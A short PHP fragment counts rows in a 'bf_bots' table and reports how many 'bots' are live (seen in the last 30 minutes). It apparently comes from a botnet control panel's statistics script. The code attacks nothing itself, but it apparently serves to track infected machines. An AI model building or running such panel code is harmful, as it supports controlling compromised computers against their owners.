
$r = $mysqli->query("select count(id) count from bf_bots");
$r = $r->fetch_object();
$count['bots'] = $r->count;

$r = $mysqli->query("select count(id) count from bf_bots WHERE (last_date > '".(time()-1800)."')");
$r = $r->fetch_object();
$count['live'] = $r->count;

print(json_encode($count));
